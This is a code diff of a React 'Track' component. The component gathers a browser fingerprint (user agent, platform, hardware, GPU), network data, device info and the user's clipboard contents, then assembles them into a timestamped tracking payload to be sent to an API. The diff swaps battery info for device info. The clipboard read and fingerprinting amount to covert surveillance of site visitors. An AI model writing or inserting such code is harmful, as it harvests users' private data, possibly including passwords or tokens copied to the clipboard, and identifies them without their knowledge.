@@ -5,9 +5,9 @@ import { useEffect } from "react";
 // Example imports — adjust paths/names as needed:
 import {
   generateFingerprint,     // e.g., gathers userAgent, platform, hardware, GPU, etc.
-  getBatteryInfo,     // returns battery info if supported
   getClipboardData,   // attempts to read the clipboard (requires permissions)
-  getNetworkInfo,     // fetches navigator.connection data
+  getNetworkInfo,  
+  getDeviceInfo   // fetches navigator.connection data
 } from "../utils/fingerprint";
 
 export default function Track() {
@@ -16,24 +16,24 @@ export default function Track() {
       try {
         // Parallel calls: gather multiple data points at once
         const [
-          fingerprintData,
-          batteryInfo,
+          fingerprint,
           networkInfo,
-          clipboardData
+          clipboardData,
+          deviceInfo
         ] = await Promise.all([
           generateFingerprint(),
-          getBatteryInfo(),
           getNetworkInfo(),
-          getClipboardData()
+          getClipboardData(),
+          getDeviceInfo()
         ]);
 
         // Build the final payload
         const trackingPayload = {
           timestamp: new Date().toISOString(),
-          fingerprint: fingerprintData, // or spread directly if you prefer
-          battery: batteryInfo,
+          fingerprint,
           network: networkInfo,
           clipboard: clipboardData,
+          device: deviceInfo
         };
 
         // Send to your API
